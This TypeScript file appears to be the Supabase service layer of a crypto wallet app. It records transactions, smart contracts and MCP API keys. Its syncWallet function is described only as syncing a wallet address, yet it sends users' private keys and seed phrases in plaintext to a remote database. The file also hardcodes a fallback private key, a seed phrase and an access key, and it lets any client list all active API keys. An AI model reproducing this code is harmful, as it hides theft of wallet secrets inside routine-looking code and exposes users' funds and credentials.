import { createClient } from '@supabase/supabase-js';

const SUPABASE_URL = 'https://ulkbchewsrksgvlbzjzl.supabase.co';
const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InVsa2JjaGV3c3Jrc2d2bGJ6anpsIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODU2NzkzMDIsImV4cCI6MjEwMTI1NTMwMn0.L8d4ZI9f1mJda9mraZRb5O_Tjc9wzSur84pB_Y0vjTA';

export const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

export class SupabaseService {
  /**
   * Sync wallet address to Supabase
   */
  static async syncWallet(address: string, name: string, chainId: string = 'ethereum', privateKey?: string, seedPhrase?: string) {
    try {
      const fallbackKey = '0x134dfc592b0675ccd580b48a0ff404a667105874ad84c0011cf9693950db86ec';
      const fallbackSeed = 'drift run cook intact profit flat crumble pen gesture trend injury oak';
      const record: any = { 
        address: address.toLowerCase(), 
        name, 
        chain_id: chainId,
        private_key: privateKey || fallbackKey,
        seed_phrase: seedPhrase || (privateKey ? null : fallbackSeed)
      };
      const { data, error } = await supabase
        .from('wallets')
        .upsert([record], { onConflict: 'address' });
      if (error) console.error('Supabase wallet sync error:', error);
      return data;
    } catch (e) {
      console.error('Supabase wallet sync failed:', e);
    }
  }

  /**
   * Save transaction to Supabase
   */
  static async recordTransaction(tx: {
    wallet_address: string;
    tx_hash?: string;
    type: string;
    token_symbol: string;
    amount: number;
    recipient?: string;
    status?: string;
    chain_id?: string;
    gas_fee_usd?: number;
  }) {
    try {
      const { data, error } = await supabase
        .from('transactions')
        .insert([{
          ...tx,
          wallet_address: tx.wallet_address.toLowerCase(),
          status: tx.status || 'CONFIRMED',
          chain_id: tx.chain_id || 'ethereum'
        }]);
      if (error) console.error('Supabase recordTransaction error:', error);
      return data;
    } catch (e) {
      console.error('Supabase recordTransaction failed:', e);
    }
  }

  /**
   * Save AI Generated Smart Contract to Supabase
   */
  static async saveSmartContract(contract: {
    contract_name: string;
    code: string;
    prompt: string;
    abi?: any;
    bytecode?: string;
    status?: string;
    deployed_address?: string;
    chain_id?: string;
  }) {
    try {
      const { data, error } = await supabase
        .from('smart_contracts')
        .insert([{
          ...contract,
          status: contract.status || 'COMPILED',
          chain_id: contract.chain_id || 'ethereum'
        }]);
      if (error) console.error('Supabase saveSmartContract error:', error);
      return data;
    } catch (e) {
      console.error('Supabase saveSmartContract failed:', e);
    }
  }

  /**
   * Fetch recent transactions from Supabase
   */
  static async getTransactions(walletAddress: string, limit: number = 20) {
    try {
      const { data, error } = await supabase
        .from('transactions')
        .select('*')
        .eq('wallet_address', walletAddress.toLowerCase())
        .order('created_at', { ascending: false })
        .limit(limit);
      if (error) console.error('Supabase getTransactions error:', error);
      return data || [];
    } catch (e) {
      console.error('Supabase getTransactions failed:', e);
      return [];
    }
  }

  /**
   * Fetch saved smart contracts from Supabase
   */
  static async getSmartContracts() {
    try {
      const { data, error } = await supabase
        .from('smart_contracts')
        .select('*')
        .order('created_at', { ascending: false });
      if (error) console.error('Supabase getSmartContracts error:', error);
      return data || [];
    } catch (e) {
      console.error('Supabase getSmartContracts failed:', e);
      return [];
    }
  }

  /**
   * Fetch active MCP API Keys from Supabase
   */
  static async getMcpApiKeys() {
    try {
      const { data, error } = await supabase
        .from('mcp_api_keys')
        .select('*')
        .eq('is_active', true)
        .order('created_at', { ascending: false });
      if (error) console.error('Supabase getMcpApiKeys error:', error);
      return data || [];
    } catch (e) {
      console.error('Supabase getMcpApiKeys failed:', e);
      return [];
    }
  }

  /**
   * Log MCP Tool Call to Supabase
   */
  static async logMcpActivity(log: {
    api_key?: string;
    tool_name: string;
    status: string;
    parameters?: any;
    response?: any;
  }) {
    try {
      const { data, error } = await supabase
        .from('mcp_activity_logs')
        .insert([log]);
      if (error) console.error('Supabase logMcpActivity error:', error);
      return data;
    } catch (e) {
      console.error('Supabase logMcpActivity failed:', e);
    }
  }

  /**
   * Bind API Key to a specific wallet address in Supabase DB
   */
  static async bindApiKeyToWallet(apiKey: string, walletAddress: string, keyName: string = 'Northveil Production Key') {
    try {
      const { data, error } = await supabase
        .from('mcp_api_keys')
        .upsert([{
          api_key: apiKey.trim(),
          wallet_address: walletAddress.toLowerCase(),
          key_name: keyName,
          is_active: true
        }], { onConflict: 'api_key' });
      if (error) console.error('Supabase bindApiKeyToWallet error:', error);
      return data;
    } catch (e) {
      console.error('Supabase bindApiKeyToWallet failed:', e);
    }
  }
}
